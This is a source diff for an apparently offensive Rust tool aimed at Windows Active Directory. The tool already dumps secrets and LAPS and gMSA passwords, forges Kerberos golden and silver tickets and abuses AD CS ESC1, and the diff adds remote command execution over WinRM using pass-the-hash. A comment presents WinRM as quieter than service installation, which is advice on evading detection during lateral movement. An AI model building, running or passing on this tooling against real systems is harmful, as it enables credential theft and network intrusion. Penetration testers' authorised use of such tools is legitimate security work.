@@ -10,6 +10,7 @@ use clap::{Parser, Subcommand};
 mod interactive;
 mod poison;
 mod session;
+mod winrm;
 
 #[derive(Parser)]
 #[command(
@@ -21,6 +22,10 @@ struct Cli {
     /// Reuse the last saved session (skip setup prompts, go straight to the menu).
     #[arg(long)]
     old: bool,
+
+    /// Don't persist the session (creds) to disk — for use on a client/engagement box.
+    #[arg(long)]
+    no_save: bool,
 
     #[command(subcommand)]
     cmd: Option<Command>,
@@ -103,6 +108,8 @@ enum AttackCmd {
     Gmsa(GmsaArgs),
     /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
     Laps(LapsArgs),
+    /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
+    Winrm(WinrmArgs),
     /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
     Esc1(Esc1Args),
     /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
@@ -280,6 +287,29 @@ struct LapsArgs {
     /// Computer sAMAccountName to read (e.g. WIN11$). Omit to dump every LAPS password you can read.
     #[arg(long)]
     target: Option<String>,
+}
+
+#[derive(Parser)]
+struct WinrmArgs {
+    /// Target host or IP
+    #[arg(long)]
+    host: String,
+    /// WinRM port (5985 HTTP)
+    #[arg(long, default_value_t = 5985)]
+    port: u16,
+    /// NetBIOS or DNS domain (use "." or the host for a local account)
+    #[arg(long)]
+    domain: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long, default_value = "")]
+    password: String,
+    /// Pass-the-hash: NT hash (32 hex) instead of --password
+    #[arg(long)]
+    nt_hash: Option<String>,
+    /// Command to run (via cmd.exe /c)
+    #[arg(long)]
+    command: String,
 }
 
 #[derive(Parser)]
@@ -564,7 +594,7 @@ async fn main() -> Result<()> {
     let cli = Cli::parse();
 
     match cli.cmd {
-        None => interactive::run(cli.old).await,
+        None => interactive::run(cli.old, cli.no_save).await,
         Some(cmd) => dispatch(cmd).await,
     }
 }
@@ -593,6 +623,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
         Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
         Command::Attack(AttackCmd::Laps(a)) => laps(a).await,
+        Command::Attack(AttackCmd::Winrm(a)) => winrm_exec(a).await,
         Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
         Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
         Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
@@ -1277,6 +1308,35 @@ async fn laps(a: LapsArgs) -> Result<()> {
         }
     }
     eprintln!("[+] LAPS: {cleartext} cleartext local-admin password(s) recovered");
+    Ok(())
+}
+
+/// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
+/// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
+async fn winrm_exec(a: WinrmArgs) -> Result<()> {
+    let secret = match &a.nt_hash {
+        Some(h) => {
+            let raw = hex::decode(h.trim()).context("NT hash must be 32 hex chars")?;
+            let arr: [u8; 16] = raw
+                .as_slice()
+                .try_into()
+                .context("NT hash must be exactly 16 bytes (32 hex)")?;
+            winrm::Secret::NtHash(arr)
+        }
+        None => winrm::Secret::Password(a.password.clone()),
+    };
+    let (mut client, shell_id) =
+        winrm::WinRm::connect(&a.host, a.port, &a.domain, &a.user, &secret).await?;
+    eprintln!(
+        "[+] WinRM shell opened on {} (ShellId {})",
+        a.host, shell_id
+    );
+    let (stdout, stderr, exit) = client.run(&shell_id, &a.command).await?;
+    print!("{stdout}");
+    if !stderr.is_empty() {
+        eprint!("{stderr}");
+    }
+    eprintln!("[+] WinRM command exited {exit}");
     Ok(())
 }
 
